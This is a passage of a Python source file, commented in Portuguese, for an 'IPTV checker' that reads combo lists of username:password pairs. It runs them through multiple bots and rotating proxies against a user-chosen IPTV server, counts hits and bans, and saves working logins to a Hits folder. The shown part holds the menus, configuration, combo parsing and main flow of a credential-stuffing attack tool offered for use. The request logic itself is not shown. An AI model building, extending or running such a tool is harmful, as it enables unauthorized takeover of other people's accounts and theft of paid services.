    output.append(tabulate(tabela_host, headers=[deepseek, infor_x], tablefmt="pretty"))
    
    # Se estiver usando proxy, adiciona informações de proxy
    if usar_proxy == "1":
        tipo_proxy_str = {
            1: "HTTP/HTTPS",
            2: "SOCKS4",
            3: "SOCKS5"
        }.get(tipo_proxy, "Desconhecido")
        
        tabela_proxies = [
            [f"\n{cor.azul}PROXYS CONFIGS{cor.reset}", "INFO"],
            ["TIPO", tipo_proxy_str],
            ["ARQUIVO", os.path.basename(arquivo_proxy) if arquivo_proxy else "Nenhum arquivo carregado"],
            ["PROXY ATUAL", proxy_escolhida if proxy_escolhida else "Nenhuma proxy em uso"],
            ["ALIVE", f"{cor.verde}{proxies_bons_count}{cor.reset}"],
            ["BADS", f"{cor.vermelho}{proxies_ruins_count}{cor.reset}"],
            ["BANNED", f"{cor.amarelo}{bans}{cor.reset}"]
        ]
        output.append(tabulate(tabela_proxies, tablefmt="pretty"))
    
    # Exibe tudo de uma vez
    print("\n".join(output))
    sys.stdout.flush()


def banner_checking(config, t, return_str=False):
    """Banner RGB com sequência exata: 6 cores crescentes + 5x6 cores decrescentes"""
    banner_color = config.get("banner_color", "90m")
    
    if banner_color == "rgb":
        # Estado persistente entre chamadas
        if not hasattr(banner_checking, 'color_state'):
            banner_checking.color_state = {
                'current': 16,      # Começa no 16 (preto)
                'direction': 1,     # 1 = crescente, -1 = decrescente
                'sequence_num': 0,  # 0 = normal, 1-5 = invertida
                'step': 0           # Contador de passos (0-5)
            }
        
        state = banner_checking.color_state

        # Lógica da sequência de cores
        if state['sequence_num'] == 0:  # Sequência NORMAL (6 cores crescentes)
            if state['step'] < 5:
                state['current'] += 1
                state['step'] += 1
            else:
                state['sequence_num'] = 1
                state['direction'] = -1
                state['current'] = state['current'] + 11  # Pula para início da 1ª sequência invertida
                state['step'] = 0
        else:  # Sequências INVERTIDAS (5 sequências de 6 cores decrescentes)
            if state['step'] < 5:
                state['current'] += state['direction']
                state['step'] += 1
            else:
                state['sequence_num'] += 1
                if state['sequence_num'] > 5:  # Reinicia após 5 sequências invertidas
                    state['sequence_num'] = 0
                    state['direction'] = 1
                    state['current'] = state['current'] + 6  # Próximo bloco normal
                else:
                    state['current'] = state['current'] + 12  # Próxima sequência invertida
                state['step'] = 0

        # Garante que a cor está entre 16-255
        state['current'] = max(16, min(state['current'], 255))

        # Banner com a cor atual (TODO o banner na mesma cor)
        banner_text = f"""\033[38;5;{state['current']}m
        ____                 ____            _    
       |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
       | | | |/ _ \\/ _ \\ '_ \\___ \\ / _ \\/ _ \\ |/ /
       | |_| |  __/  __/ |_) |__) |  __/  __/   < 
       |____/ \\___|\\___| .__/____/ \\___|\\___|_|\\_\\
        ___ ____ ______|_|   __   ____ _   _ _  __
       |_ _|  _ \\_   _\\ \\   / /  / ___| | | | |/ /
        | || |_) || |  \\ \\ / /  | |   | |_| | ' / 
        | ||  __/ | |   \\ V /   | |___|  _  | . \\ 
       |___|_|    |_|    \\_/     \\____|_| |_|_|\\_\\
                                            \033[0m
{cor.c_purple}
            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 4 Beta: 5{cor.reset}
            Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""
    
    else:  # Modo azul padrão
        banner_text = f"""\033[38;5;33m
        ____                 ____            _    
       |  _ \\  ___  ___ _ __/ ___|  ___  ___| | __
       | | | |/ _ \\/ _ \\ '_ \\___ \\ / _ \\/ _ \\ |/ /
       | |_| |  __/  __/ |_) |__) |  __/  __/   < 
       |____/ \\___|\\___| .__/____/ \\___|\\___|_|\\_\\
        ___ ____ ______|_|   __   ____ _   _ _  __
       |_ _|  _ \\_   _\\ \\   / /  / ___| | | | |/ /
        | || |_) || |  \\ \\ / /  | |   | |_| | ' / 
        | ||  __/ | |   \\ V /   | |___|  _  | . \\ 
       |___|_|    |_|    \\_/     \\____|_| |_|_|\\_\\
                                        \033[0m
{cor.c_purple}
            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 4 Beta: 5{cor.reset}
            Translated by: {t('traduce.traduce_json', default='Json não carregado')}{cor.reset}\n"""

    if return_str:
        return banner_text
    print(banner_text, end='')


# ==============================================
# MENUS E FLUXO PRINCIPAL
# ==============================================
def mostrar_menu_principal(config, t):
    banner(config, t)
    print(f"\n{cor.ciano}  ===== {t('menu.main_title', 'MAIN MENU')} ====={cor.reset}")
    print(f"{cor.atention}  {t('menu.choose_option', 'Please make a choice!')}{cor.reset}")
    print(f"{cor.azul}  = 1. {t('menu.menu_start', 'START CHECKER SCAN')}{cor.reset}")
    print(f"{cor.azul}  = 2. {t('menu.settings', 'GLOBAL SETTINGS')}{cor.reset}")
    print(f"{cor.azul}  = 3. {t('menu.exit_script', 'EXIT SCRIPT')}{cor.reset}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
    
    while True:
        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        if escolha in ("1", "2", "3"):
            if escolha == "3":
                banner(config, t)
                print(f"\n  {cor.amarelo}{t('menu.exit_info1')}{cor.reset}")
                print(f"  {cor.verde}{t('menu.exit_info2')}{cor.reset}")
                print(f"  {cor.azul}{t('menu.exit_info3')}{cor.reset}")
                print(f"  {cor.white_n}{t('menu.exit_info4')}{cor.reset}")
                sys.exit(0)
            return escolha
        print(f"\n{cor.vermelho}  {t('responses.invalid_option', 'Invalid option!')}{cor.reset}")


def mostrar_menu_configuracoes(config, t):
    """Menu de configurações com opções de idioma, SO e categorias"""
    while True:
        banner(config, t)
        print(f"\n{cor.ciano}  === {t('settings_title', 'SETTINGS')} ==={cor.reset}")
        print(f"{cor.azul}  = 1. {t('change_language', 'Change Language')} (Atual: {config['idioma']}){cor.reset}")
        print(f"{cor.azul}  = 2. {t('change_os', 'Change operating system')} (Atual: {config['sistema_operacional'] or 'Não configurado'}){cor.reset}")
        print(f"{cor.azul}  = 3. {t('menu.categoria_menu', 'CATEGORY SETTINGS')}{cor.reset}")
        print(f"{cor.azul}  = 4. {t('menu.banner_settings', 'BANNER SETTINGS')}{cor.reset}")
        print(f"{cor.azul}  = 5. {t('save_exit', 'Save and exit')}{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')

        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        
        if escolha == "1":
            config["idioma"] = selecionar_idioma()
        elif escolha == "2":
            config["sistema_operacional"] = escolher_sistema_operacional(config, t)
        elif escolha == "3":
            configurar_categoria(config, t)
        elif escolha == "4":
            configurar_banner(config, t)  # Nova função
        elif escolha == "5":
            salvar_configuracao(config)
            break
        else:
            print(f"{cor.vermelho}{t('invalid_option')}{cor.reset}")


# Função para configurar o banner:
def configurar_banner(config, t):
    """Menu para configurar as opções do banner"""
    while True:
        banner(config, t)
        current_color = config.get("banner_color", "90m")
        color_name = "Azul padrão (90m)" if current_color == "90m" else "RGB (multicolorido)"
        
        print(f"\n{cor.ciano}  === CONFIGURAÇÕES DO BANNER ==={cor.reset}")
        print(f"{cor.azul}  1. Cor do banner (Atual: {color_name}){cor.reset}")
        print(f"{cor.azul}  2. Voltar{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')

        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        
        if escolha == "1":
            print(f"\n{cor.ciano}Selecione o estilo do banner:{cor.reset}")
            print(f"{cor.azul}1. Azul padrão (90m){cor.reset}")
            print(f"{cor.azul}2. RGB (multicolorido){cor.reset}")
            color_choice = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
            
            if color_choice == "1":
                config["banner_color"] = "90m"
            elif color_choice == "2":
                config["banner_color"] = "rgb"
            else:
                print(f"{cor.vermelho}Opção inválida!{cor.reset}")
                continue
                
            salvar_configuracao(config)  # Salva imediatamente a escolha
            print(f"{cor.verde}Configuração do banner salva!{cor.reset}")
            time.sleep(1)
        elif escolha == "2":
            break
        else:
            print(f"{cor.vermelho}Opção inválida!{cor.reset}")

# Adicionar nova função para selecionar tipo de categoria
def selecionar_tipo_categoria(config, t):
    """Permite ao usuário escolher o formato de exibição das categorias"""
    banner(config, t)
    print(f"\n{cor.ciano}  === {t('menu.categoria_title', 'CONF. DE CATEGORIAS')} ==={cor.reset}")
    print(f"{cor.azul}  1. {t('menu.categoria_empilhado', 'Empilhado')} (Atual: {'[✓]' if config['categoria_tipo'] == 'empilhado' else '[X]'}){cor.reset}")
    print(f"    1. CHANNEL | X")
    print(f"    2. CHANNEL | Y")
    print(f"    3. CHANNEL | Z")
    print(f"{cor.azul}  2. {t('menu.categoria_unido', 'Unido')} (Atual: {'[✓]' if config['categoria_tipo'] == 'unido' else '[X]'}){cor.reset}")
    print(f"    1. CHANNEL | X • 2. CHANNEL | Y • 3. CHANNEL | Z")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')

    while True:
        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        if escolha == "1":
            return "empilhado"
        elif escolha == "2":
            return "unido"
        else:
            print(f"{cor.vermelho}{t('responses.invalid_option')}{cor.reset}")


def configurar_categoria(config, t):
    """Submenu para configurar categorias"""
    while True:
        banner(config, t)
        print(f"\n{cor.ciano}  === {t('menu.categoria_title', 'CONFIGURAÇÕES DE CATEGORIA')} ==={cor.reset}")
        print(f"{cor.azul}  1. {t('menu.categoria_estilo', 'Configurar estilo')} (Atual: {config['categoria_tipo'].upper()}){cor.reset}")
        print(f"{cor.azul}  2. {t('save_exit', 'Voltar')}{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')

        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
        if escolha == "1":
            config["categoria_tipo"] = selecionar_tipo_categoria(config, t)
            salvar_configuracao(config)
        elif escolha == "2":
            break
        else:
            print(f"{cor.vermelho}{t('responses.invalid_option')}{cor.reset}")


def selecionar_idioma():
    """Permite ao usuário escolher um idioma"""
    idiomas = listar_idiomas_disponiveis()
    
    if not idiomas:
        print(f"{cor.vermelho}Nenhum arquivo de idioma encontrado na pasta '{LANG_DIR}/'!{cor.reset}")
        return "pt"
    
    print(f"\n{cor.ciano}Idiomas disponíveis:{cor.reset}")
    for idx, idioma in enumerate(idiomas, 1):
        print(f"{cor.azul}{idx}. {idioma}{cor.reset}")
    
    while True:
        try:
            escolha = int(input(f"{cor.verde}Selecione >> {cor.reset}")) - 1
            if 0 <= escolha < len(idiomas):
                return idiomas[escolha]
        except:
            pass
        print(f"{cor.vermelho}Seleção inválida!{cor.reset}")

# ==============================================
# FUNÇÃO PRINCIPAL
# ==============================================
def main():
    proxies = []
    tipo_proxy = None
    config = carregar_configuracoes()
    t = criar_t(config)

    # Se ainda não escolheu sistema operacional
    if not config.get("sistema_operacional"):
        config["sistema_operacional"] = escolher_sistema_operacional(config, t)
        config["configurado"] = True
        salvar_configuracao(config)

    # Se ainda não escolheu idioma
    if not config.get("idioma"):
        banner(config, t)
        print(f"\n  {cor.amarelo}Idioma não configurado. Selecione o idioma:{cor.reset}")
        config["idioma"] = selecionar_idioma()
        salvar_configuracao(config)

    # Menu principal
    while True:
        escolha = mostrar_menu_principal(config, t)
        if escolha == "1":
            break
        elif escolha == "2":
            mostrar_menu_configuracoes(config, t)

    # Perguntar o host do servidor
    banner(config, t)
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    print(f"  {cor.atention}{t("questions.server_host")}{cor.reset}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
    server = input(f"{cor.verde}  {t("responses.response")} >>> {cor.reset}")
    server = limpar_host(server)
    if not server:
        print(f"{cor.vermelho}\n  {t("responses.invalid_host")}{cor.reset}")
        return

    banner(config, t)
    # Resto do código
    sistema_operacional = config["sistema_operacional"]
    caminho_base = determinar_caminho_base(sistema_operacional)
    
    if not caminho_base:
        print(f"{cor.vermelho}  {t('responses.system_not_suported')}{cor.reset}")
        return

    # Define os caminhos das pastas
    pasta_combo = os.path.join(caminho_base, "Combo")
    pasta_proxy = os.path.join(caminho_base, "Proxy")
    pasta_hits = os.path.join(caminho_base, "Hits")

    # Criar pastas se não existirem
    for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
        if not os.path.exists(pasta):
            print(f"{cor.amarelo}  {t('responses.creating_folder_combo')} {pasta}{cor.reset}")
            os.makedirs(pasta)

    arquivo_combo = escolher_arquivo(pasta_combo, t, tipo="combo")
    
    if not arquivo_combo:
        return

    # Perguntar se deseja usar proxy
    banner(config, t)
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    print(f"  {cor.atention}{t("questions.confirm_proxy")}{cor.reset}")
    print(f"  {cor.azul}1. {t("questions.yes")}\n  2. {t("questions.no")}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
    usar_proxy = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")
    if usar_proxy not in ["1", "2"]:
        print(f"\n  {cor.vermelho}{t("questions.error_question_proxy")}{cor.reset}")
        return

    if usar_proxy == "1":
        banner(config, t)
        arquivo_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy")
        
        proxies = []
        tipo_proxy = None
        
        # Se retornar uma tupla, é porque escolheu API (proxies, tipo_proxy)
        if isinstance(arquivo_proxy, tuple):
            proxies, tipo_proxy = arquivo_proxy
            arquivo_proxy = "ONLINE_API"  # Para exibição apenas
        elif arquivo_proxy:
            # Se for arquivo normal, ler proxies e perguntar tipo
            with open(arquivo_proxy, 'r') as f:
                proxies = [linha.strip() for linha in f.readlines()]
            
            # Escolher tipo de proxy apenas se não veio da API
            banner(config, t)
            print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
            print(f"{cor.atention}  {t("questions.proxy_type")}{cor.reset}")
            print(f"{cor.azul}  1. HTTP/HTTPS{cor.reset}")
            print(f"{cor.azul}  2. SOCKS4{cor.reset}")
            print(f"{cor.azul}  3. SOCKS5{cor.reset}")
            print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
            try:
                tipo_proxy = int(input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}"))
                if tipo_proxy not in [1, 2, 3]:
                    print(f"\n  {cor.vermelho}{t("questions.error_type_proxy")}{cor.reset}")
                    return
            except ValueError:
                print(f"{cor.vermelho}\n  {t("responses.invalid_type_proxy")}{cor.reset}")
                return
        else:
            return

    # Perguntar se deseja mostrar categorias
    banner(config, t)
    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
    print(f"  {cor.atention}{t("questions.show_categories")}{cor.reset}")
    print(f"  {cor.azul}1. {t("questions.yes")}\n  2. {t("questions.no")}")
    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
    mostrar_categorias = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")
    if mostrar_categorias not in ["1", "2"]:
        print(f"\n  {cor.vermelho}{t("responses.invalid_option")}{cor.reset}")
        return

    # Perguntar o número de bots
    try:
        banner(config, t)
        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
        print(f"{cor.atention}  {t("questions.number_of_bots")}{cor.reset}")
        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
        num_bots = int(input(f"{cor.verde}\n  {t("responses.response")} >>> {cor.reset}"))
        if num_bots < 1:
            print(f"{cor.vermelho}{t("responses.invalid_number_of_bots")}{cor.reset}")
            return
    except ValueError:
        print(f"{cor.vermelho}{t("responses.invalid_input_number")}{cor.reset}")
        return

    # Ler combos (usuário:senha)
    combos = []
    linhas_invalidas = 0
    with open(arquivo_combo, 'r', encoding='utf-8') as f:
        for linha in f.readlines():
            linha = linha.strip()
            if ":" in linha and len(linha.split(":")) == 2:  # Verifica se a linha está no formato correto
                username, password = linha.split(":", 1)  # Divide apenas no primeiro ":"
                combos.append((username, password))
            else:
                linhas_invalidas += 1

    if linhas_invalidas > 0:
        print(f"{cor.amarelo}{t("responses.removing_invalid_lines").format(linhas_invalidas=linhas_invalidas)}{cor.reset}")

    if not combos:
        print(f"{cor.vermelho}{t("responses.no_valid_combo_found")}{cor.reset}")
        return

    # Configurar headers personalizados
    headers = {
        "Host": server,
        "Referer": f"http://{server}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    # Formatar nome do arquivo de resultados
    nome_arquivo = f"ChK IPTV [ {server.replace(':', '_')} ].txt"
    caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)

    # Contadores de hits, bads e bans
    hits = 0
    bads = 0
    bans = 0
    total_linhas = len(combos)

    # Processar combos com múltiplos bots
    hits, bads, bans = processar_combos(
        combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, 
        total_linhas, caminho_arquivo, usar_proxy,
        arquivo_proxy if usar_proxy == "1" else None, config, t,
        mostrar_categorias == "1"
    )

    # Exibir resumo final simplificado
    print(f"\n{cor.magenta}{t("menu.exit_message_1")}{cor.reset}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n{cor.vermelho}  CRITICAL ERROR: {e}{cor.reset}")
        traceback.print_exc()
        input("Pressione Enter para sair...")